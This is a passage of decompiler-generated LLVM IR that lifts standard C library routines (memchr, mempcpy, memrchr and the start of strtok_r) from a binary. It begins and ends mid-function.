  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1000d5d0.dec_label_pc_1000d5d0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d590, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d560, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000d5f4 = urem i32 %arg1, 256
  store i32 %v1_1000d5f4, i32* %r4.global-to-local, align 4
  %v0_1000d6147 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000d61813 = icmp eq i32 %arg2, 0
  br i1 %v2_1000d61813, label %dec_label_pc_1000d620, label %dec_label_pc_1000d61c

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d61c
  %v1_1000d600 = inttoptr i32 %v0_1000d600 to i8*
  %v2_1000d600 = load i8, i8* %v1_1000d600, align 1
  %v3_1000d600 = zext i8 %v2_1000d600 to i32
  %v0_1000d604 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d604 = add i32 %v0_1000d604, -1
  store i32 %v1_1000d604, i32* %r5.global-to-local, align 4
  %v1_1000d608 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d608 = icmp eq i32 %v3_1000d600, %v1_1000d608
  %v0_1000d60c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d608, i32 %v0_1000d60c)
  %v0_1000d610 = load i32, i32* @r3, align 4
  %v1_1000d610 = add i32 %v0_1000d610, 1
  store i32 %v1_1000d610, i32* @r3, align 4
  %v0_1000d618 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d618 = add i32 %v0_1000d618, -1
  store i32 %v1_1000d618, i32* %ctr.global-to-local, align 4
  %v2_1000d618 = icmp eq i32 %v1_1000d618, 0
  br i1 %v2_1000d618, label %dec_label_pc_1000d620.loopexit, label %dec_label_pc_1000d61c

dec_label_pc_1000d61c:                            ; preds = %entry, %dec_label_pc_1000d600
  %v0_1000d600 = phi i32 [ %v1_1000d610, %dec_label_pc_1000d600 ], [ %v0_1000d6147, %entry ]
  %v0_1000d61c.in.in = phi i32 [ %v1_1000d610, %dec_label_pc_1000d600 ], [ %v0_1000d6147, %entry ]
  %v0_1000d61c.in = urem i32 %v0_1000d61c.in.in, 4
  %v0_1000d61c = icmp eq i32 %v0_1000d61c.in, 0
  br i1 %v0_1000d61c, label %dec_label_pc_1000d620.loopexit, label %dec_label_pc_1000d600

dec_label_pc_1000d620.loopexit:                   ; preds = %dec_label_pc_1000d61c, %dec_label_pc_1000d600
  %v0_1000d64816.ph = phi i32 [ %v1_1000d610, %dec_label_pc_1000d600 ], [ %v0_1000d600, %dec_label_pc_1000d61c ]
  %v0_1000d620.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000d624.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d620

dec_label_pc_1000d620:                            ; preds = %dec_label_pc_1000d620.loopexit, %entry
  %v0_1000d624 = phi i32 [ 0, %entry ], [ %v0_1000d624.pre, %dec_label_pc_1000d620.loopexit ]
  %v0_1000d620 = phi i32 [ %v1_1000d5f4, %entry ], [ %v0_1000d620.pre, %dec_label_pc_1000d620.loopexit ]
  %v0_1000d64816 = phi i32 [ %v0_1000d6147, %entry ], [ %v0_1000d64816.ph, %dec_label_pc_1000d620.loopexit ]
  %v1_1000d620 = mul i32 %v0_1000d620, 256
  %v1_1000d624 = udiv i32 %v0_1000d624, 4
  %v2_1000d628 = or i32 %v1_1000d620, %v0_1000d620
  %v1_1000d630 = mul i32 %v2_1000d628, 65536
  %v2_1000d63c = or i32 %v1_1000d630, %v2_1000d628
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_1000d624, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000d624, 4
  br i1 %tmp, label %dec_label_pc_1000d6d0, label %dec_label_pc_1000d648

dec_label_pc_1000d648:                            ; preds = %dec_label_pc_1000d620, %dec_label_pc_1000d6cc.backedge
  %v0_1000d6cc = phi i32 [ %v1_1000d6cc, %dec_label_pc_1000d6cc.backedge ], [ %v1_1000d624, %dec_label_pc_1000d620 ]
  %v0_1000d650 = phi i32 [ %v1_1000d650, %dec_label_pc_1000d6cc.backedge ], [ %v0_1000d624, %dec_label_pc_1000d620 ]
  %v0_1000d688 = phi i32 [ %v1_1000d64c, %dec_label_pc_1000d6cc.backedge ], [ %v0_1000d64816, %dec_label_pc_1000d620 ]
  %v1_1000d648 = inttoptr i32 %v0_1000d688 to i32*
  %v2_1000d648 = load i32, i32* %v1_1000d648, align 4
  %v1_1000d64c = add i32 %v0_1000d688, 4
  store i32 %v1_1000d64c, i32* @r3, align 4
  %v1_1000d650 = add i32 %v0_1000d650, -4
  store i32 %v1_1000d650, i32* %r5.global-to-local, align 4
  %v1_1000d654 = add i32 %v0_1000d688, 1
  %v2_1000d658 = xor i32 %v2_1000d648, %v2_1000d63c
  %v1_1000d660 = add i32 %v2_1000d658, 2130640639
  %v2_1000d664 = xor i32 %v1_1000d660, %v2_1000d658
  %v2_1000d668 = and i32 %v2_1000d664, -2130640640
  %v6_1000d668 = icmp eq i32 %v2_1000d668, -2130640640
  br i1 %v6_1000d668, label %dec_label_pc_1000d6cc.backedge, label %dec_label_pc_1000d674

dec_label_pc_1000d6cc.backedge:                   ; preds = %dec_label_pc_1000d648, %dec_label_pc_1000d6b8
  %v1_1000d6cc = add i32 %v0_1000d6cc, -1
  store i32 %v1_1000d6cc, i32* %ctr.global-to-local, align 4
  %v2_1000d6cc = icmp eq i32 %v1_1000d6cc, 0
  br i1 %v2_1000d6cc, label %dec_label_pc_1000d6d0, label %dec_label_pc_1000d648

dec_label_pc_1000d674:                            ; preds = %dec_label_pc_1000d648
  %v2_1000d674 = inttoptr i32 %v0_1000d688 to i8*
  %v3_1000d674 = load i8, i8* %v2_1000d674, align 1
  %v4_1000d674 = zext i8 %v3_1000d674 to i32
  %v1_1000d678 = add i32 %v0_1000d688, 3
  store i32 %v1_1000d678, i32* @r8, align 4
  %v1_1000d67c = add i32 %v0_1000d688, 2
  %v4_1000d680 = icmp eq i32 %v4_1000d674, %v0_1000d620
  br i1 %v4_1000d680, label %dec_label_pc_1000d688, label %dec_label_pc_1000d690

dec_label_pc_1000d688:                            ; preds = %dec_label_pc_1000d674
  ret i32 %v0_1000d688

dec_label_pc_1000d690:                            ; preds = %dec_label_pc_1000d674
  %v2_1000d690 = inttoptr i32 %v1_1000d654 to i8*
  %v3_1000d690 = load i8, i8* %v2_1000d690, align 1
  %v4_1000d690 = zext i8 %v3_1000d690 to i32
  %v4_1000d694 = icmp eq i32 %v4_1000d690, %v0_1000d620
  br i1 %v4_1000d694, label %dec_label_pc_1000d69c, label %dec_label_pc_1000d6a4

dec_label_pc_1000d69c:                            ; preds = %dec_label_pc_1000d690
  ret i32 %v1_1000d654

dec_label_pc_1000d6a4:                            ; preds = %dec_label_pc_1000d690
  %v2_1000d6a4 = inttoptr i32 %v1_1000d67c to i8*
  %v3_1000d6a4 = load i8, i8* %v2_1000d6a4, align 1
  %v4_1000d6a4 = zext i8 %v3_1000d6a4 to i32
  %v4_1000d6a8 = icmp eq i32 %v4_1000d6a4, %v0_1000d620
  br i1 %v4_1000d6a8, label %dec_label_pc_1000d6b0, label %dec_label_pc_1000d6b8

dec_label_pc_1000d6b0:                            ; preds = %dec_label_pc_1000d6a4
  ret i32 %v1_1000d67c

dec_label_pc_1000d6b8:                            ; preds = %dec_label_pc_1000d6a4
  %v2_1000d6b8 = inttoptr i32 %v1_1000d678 to i8*
  %v3_1000d6b8 = load i8, i8* %v2_1000d6b8, align 1
  %v4_1000d6b8 = zext i8 %v3_1000d6b8 to i32
  %v4_1000d6bc = icmp eq i32 %v4_1000d6b8, %v0_1000d620
  br i1 %v4_1000d6bc, label %dec_label_pc_1000d6c4, label %dec_label_pc_1000d6cc.backedge

dec_label_pc_1000d6c4:                            ; preds = %dec_label_pc_1000d6b8
  ret i32 %v1_1000d678

dec_label_pc_1000d6d0:                            ; preds = %dec_label_pc_1000d6cc.backedge, %dec_label_pc_1000d620
  %v0_1000d6dc26 = phi i32 [ %v0_1000d64816, %dec_label_pc_1000d620 ], [ %v1_1000d64c, %dec_label_pc_1000d6cc.backedge ]
  %v0_1000d6d0 = phi i32 [ %v0_1000d624, %dec_label_pc_1000d620 ], [ %v1_1000d650, %dec_label_pc_1000d6cc.backedge ]
  %v1_1000d6d0 = add i32 %v0_1000d6d0, 1
  store i32 %v1_1000d6d0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d6d0, i32* %ctr.global-to-local, align 4
  %v2_1000d6ec3 = icmp eq i32 %v0_1000d6d0, 0
  br i1 %v2_1000d6ec3, label %dec_label_pc_1000d6f0, label %dec_label_pc_1000d6dc

dec_label_pc_1000d6dc:                            ; preds = %dec_label_pc_1000d6d0, %dec_label_pc_1000d6dc.dec_label_pc_1000d6dc_crit_edge
  %v1_1000d6e0 = phi i32 [ %v1_1000d6e0.pre, %dec_label_pc_1000d6dc.dec_label_pc_1000d6dc_crit_edge ], [ %v0_1000d620, %dec_label_pc_1000d6d0 ]
  %v0_1000d6dc = phi i32 [ %v1_1000d6e8, %dec_label_pc_1000d6dc.dec_label_pc_1000d6dc_crit_edge ], [ %v0_1000d6dc26, %dec_label_pc_1000d6d0 ]
  %v1_1000d6dc = inttoptr i32 %v0_1000d6dc to i8*
  %v2_1000d6dc = load i8, i8* %v1_1000d6dc, align 1
  %v3_1000d6dc = zext i8 %v2_1000d6dc to i32
  %v4_1000d6e0 = icmp eq i32 %v3_1000d6dc, %v1_1000d6e0
  %v0_1000d6e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d6e0, i32 %v0_1000d6e4)
  %v0_1000d6e8 = load i32, i32* @r3, align 4
  %v1_1000d6e8 = add i32 %v0_1000d6e8, 1
  store i32 %v1_1000d6e8, i32* @r3, align 4
  %v0_1000d6ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d6ec = add i32 %v0_1000d6ec, -1
  store i32 %v1_1000d6ec, i32* %ctr.global-to-local, align 4
  %v2_1000d6ec = icmp eq i32 %v1_1000d6ec, 0
  br i1 %v2_1000d6ec, label %dec_label_pc_1000d6f0, label %dec_label_pc_1000d6dc.dec_label_pc_1000d6dc_crit_edge

dec_label_pc_1000d6dc.dec_label_pc_1000d6dc_crit_edge: ; preds = %dec_label_pc_1000d6dc
  %v1_1000d6e0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d6dc

dec_label_pc_1000d6f0:                            ; preds = %dec_label_pc_1000d6dc, %dec_label_pc_1000d6d0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d6ec, { 1, 0 }
  uselistorder i32 %v1_1000d6e8, { 1, 0 }
  uselistorder i32 %v0_1000d6d0, { 1, 2, 0 }
  uselistorder i32 %v1_1000d6cc, { 2, 1, 0 }
  uselistorder i32 %v1_1000d650, { 0, 2, 1 }
  uselistorder i32 %v1_1000d64c, { 0, 2, 1 }
  uselistorder i32 %v0_1000d688, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_1000d628, { 1, 0 }
  uselistorder i32 %v1_1000d624, { 1, 0 }
  uselistorder i32 %v0_1000d64816, { 1, 0 }
  uselistorder i32 %v0_1000d620, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_1000d624, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000d618, { 1, 0 }
  uselistorder i32 %v1_1000d610, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000d6147, { 2, 0, 1 }
  uselistorder i32 %v1_1000d5f4, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d6dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d6cc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d648, { 1, 0 }
  uselistorder label %dec_label_pc_1000d61c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268490516, i32* @lr, align 4
  %v0_1000d710 = call i32 @memcpy()
  %v0_1000d718 = load i32, i32* @r28, align 4
  %v1_1000d718 = load i32, i32* @r29, align 4
  %v2_1000d718 = add i32 %v1_1000d718, %v0_1000d718
  ret i32 %v2_1000d718
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000d730 = urem i32 %arg2, 256
  store i32 %v1_1000d730, i32* %r4.global-to-local, align 4
  %v2_1000d738 = add i32 %arg3, %arg1
  store i32 %v2_1000d738, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000d75413 = icmp eq i32 %arg3, 0
  br i1 %v2_1000d75413, label %dec_label_pc_1000d75c, label %dec_label_pc_1000d758

dec_label_pc_1000d740:                            ; preds = %dec_label_pc_1000d758
  %v1_1000d740 = add i32 %v0_1000d740, -1
  %v2_1000d740 = inttoptr i32 %v1_1000d740 to i8*
  %v3_1000d740 = load i8, i8* %v2_1000d740, align 1
  %v4_1000d740 = zext i8 %v3_1000d740 to i32
  store i32 %v1_1000d740, i32* %r3.global-to-local, align 4
  %v0_1000d744 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d744 = add i32 %v0_1000d744, -1
  store i32 %v1_1000d744, i32* %r5.global-to-local, align 4
  %v1_1000d748 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d748 = icmp eq i32 %v4_1000d740, %v1_1000d748
  %v0_1000d74c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d748, i32 %v0_1000d74c)
  %v0_1000d750 = load i32, i32* %r3.global-to-local, align 4
  %v0_1000d754 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d754 = add i32 %v0_1000d754, -1
  store i32 %v1_1000d754, i32* %ctr.global-to-local, align 4
  %v2_1000d754 = icmp eq i32 %v1_1000d754, 0
  br i1 %v2_1000d754, label %dec_label_pc_1000d75c.loopexit, label %dec_label_pc_1000d758

dec_label_pc_1000d758:                            ; preds = %entry, %dec_label_pc_1000d740
  %v0_1000d740 = phi i32 [ %v0_1000d750, %dec_label_pc_1000d740 ], [ %v2_1000d738, %entry ]
  %v0_1000d758.in.in = phi i32 [ %v0_1000d750, %dec_label_pc_1000d740 ], [ %v2_1000d738, %entry ]
  %v0_1000d758.in = urem i32 %v0_1000d758.in.in, 4
  %v0_1000d758 = icmp eq i32 %v0_1000d758.in, 0
  br i1 %v0_1000d758, label %dec_label_pc_1000d75c.loopexit, label %dec_label_pc_1000d740

dec_label_pc_1000d75c.loopexit:                   ; preds = %dec_label_pc_1000d758, %dec_label_pc_1000d740
  %v0_1000d78416.ph = phi i32 [ %v0_1000d750, %dec_label_pc_1000d740 ], [ %v0_1000d740, %dec_label_pc_1000d758 ]
  %v0_1000d75c.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000d760.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d75c

dec_label_pc_1000d75c:                            ; preds = %dec_label_pc_1000d75c.loopexit, %entry
  %v0_1000d760 = phi i32 [ 0, %entry ], [ %v0_1000d760.pre, %dec_label_pc_1000d75c.loopexit ]
  %v0_1000d75c = phi i32 [ %v1_1000d730, %entry ], [ %v0_1000d75c.pre, %dec_label_pc_1000d75c.loopexit ]
  %v0_1000d78416 = phi i32 [ %v2_1000d738, %entry ], [ %v0_1000d78416.ph, %dec_label_pc_1000d75c.loopexit ]
  %v1_1000d75c = mul i32 %v0_1000d75c, 256
  %v1_1000d760 = udiv i32 %v0_1000d760, 4
  %v2_1000d764 = or i32 %v1_1000d75c, %v0_1000d75c
  %v1_1000d76c = mul i32 %v2_1000d764, 65536
  %v2_1000d778 = or i32 %v1_1000d76c, %v2_1000d764
  store i32 %v2_1000d778, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_1000d760, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000d760, 4
  br i1 %tmp, label %dec_label_pc_1000d7fc, label %dec_label_pc_1000d784

dec_label_pc_1000d784:                            ; preds = %dec_label_pc_1000d75c, %dec_label_pc_1000d7f8.backedge.dec_label_pc_1000d784_crit_edge
  %v0_1000d7f821 = phi i32 [ %v1_1000d7f8, %dec_label_pc_1000d7f8.backedge.dec_label_pc_1000d784_crit_edge ], [ %v1_1000d760, %dec_label_pc_1000d75c ]
  %v0_1000d7a4 = phi i32 [ %v0_1000d7a4.pre, %dec_label_pc_1000d7f8.backedge.dec_label_pc_1000d784_crit_edge ], [ -2130640640, %dec_label_pc_1000d75c ]
  %v0_1000d78c = phi i32 [ %v0_1000d78c.pre, %dec_label_pc_1000d7f8.backedge.dec_label_pc_1000d784_crit_edge ], [ %v2_1000d778, %dec_label_pc_1000d75c ]
  %v0_1000d788 = phi i32 [ %v0_1000d788.pre, %dec_label_pc_1000d7f8.backedge.dec_label_pc_1000d784_crit_edge ], [ %v0_1000d760, %dec_label_pc_1000d75c ]
  %v0_1000d784 = phi i32 [ %v0_1000d784.pre, %dec_label_pc_1000d7f8.backedge.dec_label_pc_1000d784_crit_edge ], [ %v0_1000d78416, %dec_label_pc_1000d75c ]
  %v1_1000d784 = add i32 %v0_1000d784, -4
  %v2_1000d784 = inttoptr i32 %v1_1000d784 to i32*
  %v3_1000d784 = load i32, i32* %v2_1000d784, align 4
  store i32 %v1_1000d784, i32* %r3.global-to-local, align 4
  %v1_1000d788 = add i32 %v0_1000d788, -4
  store i32 %v1_1000d788, i32* %r5.global-to-local, align 4
  %v2_1000d78c = xor i32 %v3_1000d784, %v0_1000d78c
  %v1_1000d790 = add i32 %v0_1000d784, -3
  %v1_1000d798 = add i32 %v2_1000d78c, 2130640639
  %v1_1000d7a0 = add i32 %v0_1000d784, -2
  %v2_1000d79c = sub i32 -1, %v2_1000d78c
  %v2_1000d7a4 = xor i32 %v1_1000d798, %v2_1000d79c
  %v3_1000d7a4 = and i32 %v2_1000d7a4, %v0_1000d7a4
  %v6_1000d7a4 = icmp eq i32 %v3_1000d7a4, 0
  %v1_1000d7a8 = add i32 %v0_1000d784, -1
  br i1 %v6_1000d7a4, label %dec_label_pc_1000d7f8.backedge, label %dec_label_pc_1000d7b0

dec_label_pc_1000d7b0:                            ; preds = %dec_label_pc_1000d784
  %v2_1000d7b0 = inttoptr i32 %v1_1000d7a8 to i8*
  %v3_1000d7b0 = load i8, i8* %v2_1000d7b0, align 1
  %v4_1000d7b0 = zext i8 %v3_1000d7b0 to i32
  %v1_1000d7b4 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d7b4 = icmp eq i32 %v4_1000d7b0, %v1_1000d7b4
  br i1 %v4_1000d7b4, label %dec_label_pc_1000d7bc, label %dec_label_pc_1000d7c4

dec_label_pc_1000d7bc:                            ; preds = %dec_label_pc_1000d7b0
  store i32 %v1_1000d7a8, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d7a8

dec_label_pc_1000d7c4:                            ; preds = %dec_label_pc_1000d7b0
  %v2_1000d7c4 = inttoptr i32 %v1_1000d7a0 to i8*
  %v3_1000d7c4 = load i8, i8* %v2_1000d7c4, align 1
  %v4_1000d7c4 = zext i8 %v3_1000d7c4 to i32
  %v4_1000d7c8 = icmp eq i32 %v4_1000d7c4, %v1_1000d7b4
  br i1 %v4_1000d7c8, label %dec_label_pc_1000d7d0, label %dec_label_pc_1000d7d8

dec_label_pc_1000d7d0:                            ; preds = %dec_label_pc_1000d7c4
  store i32 %v1_1000d7a0, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d7a0

dec_label_pc_1000d7d8:                            ; preds = %dec_label_pc_1000d7c4
  %v2_1000d7d8 = inttoptr i32 %v1_1000d790 to i8*
  %v3_1000d7d8 = load i8, i8* %v2_1000d7d8, align 1
  %v4_1000d7d8 = zext i8 %v3_1000d7d8 to i32
  %v4_1000d7dc = icmp eq i32 %v4_1000d7d8, %v1_1000d7b4
  br i1 %v4_1000d7dc, label %dec_label_pc_1000d7e4, label %dec_label_pc_1000d7ec

dec_label_pc_1000d7e4:                            ; preds = %dec_label_pc_1000d7d8
  store i32 %v1_1000d790, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d790

dec_label_pc_1000d7ec:                            ; preds = %dec_label_pc_1000d7d8
  %v1_1000d7ec = inttoptr i32 %v1_1000d784 to i8*
  %v2_1000d7ec = load i8, i8* %v1_1000d7ec, align 1
  %v3_1000d7ec = zext i8 %v2_1000d7ec to i32
  %v4_1000d7f0 = icmp eq i32 %v3_1000d7ec, %v1_1000d7b4
  %v0_1000d7f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d7f0, i32 %v0_1000d7f4)
  %v0_1000d7f8.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d7f8.backedge

dec_label_pc_1000d7f8.backedge:                   ; preds = %dec_label_pc_1000d7ec, %dec_label_pc_1000d784
  %v0_1000d7f8 = phi i32 [ %v0_1000d7f8.pre, %dec_label_pc_1000d7ec ], [ %v0_1000d7f821, %dec_label_pc_1000d784 ]
  %v1_1000d7f8 = add i32 %v0_1000d7f8, -1
  store i32 %v1_1000d7f8, i32* %ctr.global-to-local, align 4
  %v2_1000d7f8 = icmp eq i32 %v1_1000d7f8, 0
  br i1 %v2_1000d7f8, label %dec_label_pc_1000d7f8.dec_label_pc_1000d7fc_crit_edge, label %dec_label_pc_1000d7f8.backedge.dec_label_pc_1000d784_crit_edge

dec_label_pc_1000d7f8.backedge.dec_label_pc_1000d784_crit_edge: ; preds = %dec_label_pc_1000d7f8.backedge
  %v0_1000d784.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000d788.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000d78c.pre = load i32, i32* @r7, align 4
  %v0_1000d7a4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000d784

dec_label_pc_1000d7f8.dec_label_pc_1000d7fc_crit_edge: ; preds = %dec_label_pc_1000d7f8.backedge
  %v0_1000d7fc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d7fc

dec_label_pc_1000d7fc:                            ; preds = %dec_label_pc_1000d7f8.dec_label_pc_1000d7fc_crit_edge, %dec_label_pc_1000d75c
  %v0_1000d7fc = phi i32 [ %v0_1000d7fc.pre, %dec_label_pc_1000d7f8.dec_label_pc_1000d7fc_crit_edge ], [ %v0_1000d760, %dec_label_pc_1000d75c ]
  %v1_1000d7fc = add i32 %v0_1000d7fc, 1
  store i32 %v1_1000d7fc, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d7fc, i32* %ctr.global-to-local, align 4
  %v2_1000d8143 = icmp eq i32 %v0_1000d7fc, 0
  br i1 %v2_1000d8143, label %dec_label_pc_1000d818, label %dec_label_pc_1000d808

dec_label_pc_1000d808:                            ; preds = %dec_label_pc_1000d7fc, %dec_label_pc_1000d808
  %v0_1000d808 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000d808 = add i32 %v0_1000d808, -1
  %v2_1000d808 = inttoptr i32 %v1_1000d808 to i8*
  %v3_1000d808 = load i8, i8* %v2_1000d808, align 1
  %v4_1000d808 = zext i8 %v3_1000d808 to i32
  store i32 %v1_1000d808, i32* %r3.global-to-local, align 4
  %v1_1000d80c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d80c = icmp eq i32 %v4_1000d808, %v1_1000d80c
  %v0_1000d810 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d80c, i32 %v0_1000d810)
  %v0_1000d814 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d814 = add i32 %v0_1000d814, -1
  store i32 %v1_1000d814, i32* %ctr.global-to-local, align 4
  %v2_1000d814 = icmp eq i32 %v1_1000d814, 0
  br i1 %v2_1000d814, label %dec_label_pc_1000d818, label %dec_label_pc_1000d808

dec_label_pc_1000d818:                            ; preds = %dec_label_pc_1000d808, %dec_label_pc_1000d7fc
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d814, { 1, 0 }
  uselistorder i32 %v0_1000d7fc, { 1, 2, 0 }
  uselistorder i32 %v1_1000d7f8, { 2, 1, 0 }
  uselistorder i32 %v1_1000d7a8, { 1, 0, 2 }
  uselistorder i32 %v1_1000d7a0, { 1, 0, 2 }
  uselistorder i32 %v1_1000d790, { 1, 0, 2 }
  uselistorder i32 %v2_1000d764, { 1, 0 }
  uselistorder i32 %v1_1000d760, { 1, 0 }
  uselistorder i32 %v0_1000d75c, { 1, 0 }
  uselistorder i32 %v0_1000d760, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000d754, { 1, 0 }
  uselistorder i32 %v0_1000d750, { 1, 0, 2 }
  uselistorder i32 %v2_1000d738, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000d730, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 5, 6, 1, 7, 8, 2, 3, 4 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d808, { 1, 0 }
  uselistorder label %dec_label_pc_1000d784, { 1, 0 }
  uselistorder label %dec_label_pc_1000d758, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d824 = load i32, i32* @lr, align 4
  store i32 %v0_1000d824, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000d82c = icmp eq i32 %arg1, 0
  %v0_1000d834 = load i32, i32* @r5, align 4
  store i32 %v0_1000d834, i32* %r30.global-to-local, align 4
  %v0_1000d838 = load i32, i32* @r4, align 4
  store i32 %v0_1000d838, i32* %r29.global-to-local, align 4
  br i1 %v3_1000d82c, label %dec_label_pc_1000d840, label %dec_label_pc_1000d844

dec_label_pc_1000d840:                            ; preds = %entry
  %v1_1000d840 = inttoptr i32 %v0_1000d834 to i32*
  %v2_1000d840 = load i32, i32* %v1_1000d840, align 4
  store i32 %v2_1000d840, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d844

dec_label_pc_1000d844:                            ; preds = %entry, %dec_label_pc_1000d840
  %v0_1000d844 = phi i32 [ %arg1, %entry ], [ %v2_1000d840, %dec_label_pc_1000d840 ]
  store i32 %v0_1000d844, i32* @r3, align 4
  %v1_1000d848 = inttoptr i32 %v0_1000d844 to i8*
  %v2_1000d848 = call i32 @__GI_strspn(i8* %v1_1000d848)
  %v0_1000d84c = load i32, i32* %r29.global-to-local, align 4
  %v0_1000d850 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d850 = add i32 %v0_1000d850, %v2_1000d848
  %v3_1000d850 = inttoptr i32 %v2_1000d850 to i8*
  %v4_1000d850 = load i8, i8* %v3_1000d850, align 1
  store i32 %v2_1000d850, i32* @r31, align 4
  store i32 %v2_1000d850, i32* @r3, align 4
  %v3_1000d85c = icmp eq i8 %v4_1000d850, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d85c, label %dec_label_pc_1000d868, label %dec_label_pc_1000d870

dec_label_pc_1000d868:                            ; preds = %dec_label_pc_1000d844
  %v1_1000d868 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d868 = inttoptr i32 %v1_1000d868 to i32*
  store i32 %v2_1000d850, i32* %v2_1000d868, align 4
  br label %dec_label_pc_1000d8a8

dec_label_pc_1000d870:                            ; preds = %dec_label_pc_1000d844
  store i32 268490868, i32* @lr, align 4
  %v3_1000d870 = call i32 @__GI_strpbrk(i8* %v3_1000d850, i32 %v0_1000d84c)
  %v4_1000d878 = icmp eq i32 %v3_1000d870, 0
  %v0_1000d87c = load i32, i32* @r31, align 4
  store i32 %v0_1000d87c, i32* @r3, align 4
  %v2_1000d880 = add i32 %v3_1000d870, 1
  store i32 %v2_1000d880, i32* %r11.global-to-local, align 4
  br i1 %v4_1000d878, label %dec_label_pc_1000d888, label %dec_label_pc_1000d898

